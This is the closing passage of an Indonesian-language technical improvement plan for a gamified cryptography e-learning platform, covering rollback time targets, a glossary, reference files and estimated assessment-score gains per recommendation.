- [ ] Any data corruption detected
- [ ] Security vulnerability discovered post-deploy
```

### 8.4 Rollback Time Targets

| Severity | Max Rollback Time | Method |
|----------|:-----------------:|--------|
| 🔴 Critical (data loss risk) | 5 menit | Feature flag toggle |
| 🟡 Medium (functionality broken) | 15 menit | Git revert + redeploy |
| 🟢 Low (cosmetic/minor) | 1 jam | Scheduled fix in next deploy |

---

## 9. Lampiran

### 9.1 Glossary

| Term | Definisi |
|------|----------|
| **CSP** | Content Security Policy — HTTP header yang mengontrol resource mana yang boleh dimuat browser |
| **Nonce** | Number used once — random value yang di-generate per-request untuk CSP |
| **BLOB** | Binary Large Object — tipe data database untuk menyimpan binary data |
| **APM** | Application Performance Monitoring — tool untuk memantau performa aplikasi |
| **E2E** | End-to-End testing — pengujian yang mensimulasikan user flow lengkap |
| **WebSocket** | Protokol komunikasi full-duplex untuk real-time data transfer |
| **Feature Flag** | Mekanisme untuk mengaktifkan/menonaktifkan fitur tanpa redeploy |
| **Rate Limiting** | Pembatasan jumlah request per waktu untuk mencegah abuse |
| **Streak** | Jumlah jawaban benar berturut-turut dalam satu quiz session |
| **XP** | Experience Points — mata uang gamifikasi untuk leveling |
| **Points** | Mata uang gamifikasi untuk leaderboard ranking |

### 9.2 Reference Files

| File | Relevansi |
|------|-----------|
| `app/Http/Controllers/Challenge/ChallengeSubmissionController.php` | R01, R02, R07 |
| `app/Services/ChallengeScoreService.php` | R01 |
| `app/Http/Middleware/SecurityHeaders.php` | R04 |
| `app/Models/User.php` | R03 |
| `app/Services/SocialAvatarService.php` | R03 |
| `resources/js/lib/lab-simulations.ts` | R05 |
| `playwright.config.ts` | R06 |
| `app/Providers/AppServiceProvider.php` | R07 |
| `routes/web.php` | R07 |
| `app/Services/LeaderboardService.php` | R08, R09 |
| `database/schema/mysql-schema.sql` | R03, R09 |
| `config/rewards.php` | R01 (streak bonus config) |
| `.github/workflows/tests.yml` | R05, R06 |

### 9.3 Estimated Impact on Assessment Score

| Rekomendasi | Skor Saat Ini | Estimasi Setelah | Delta |
|-------------|:-------------:|:----------------:|:-----:|
| R01 + R02 (Security) | 87/100 | 95/100 | +8 |
| R03 (Architecture) | 88/100 | 93/100 | +5 |
| R04 (Security Headers) | 87/100 | 95/100 | +8 |
| R05 (Lab Tests) | 85/100 | 95/100 | +10 |
| R06 (E2E Coverage) | 85/100 | 92/100 | +7 |
| R07 (Rate Limiting) | 87/100 | 93/100 | +6 |
| R08 (Real-time) | 88/100 | 93/100 | +5 |
| R09 (DB Performance) | 88/100 | 93/100 | +5 |
| **Overall Project Score** | **89.2/100** | **~95/100** | **+5.8** |

---

> **Dokumen ini adalah living document.** Update sesuai progress aktual dan temuan baru selama implementasi. Review mingguan oleh Tech Lead direkomendasikan.

---

*Dibuat oleh: AI Assessment Engine — enowX Labs*
*Tanggal: 28 April 2026*
*Proyek: Crypter — Web-Based Gamified Cryptography E-Learning Platform*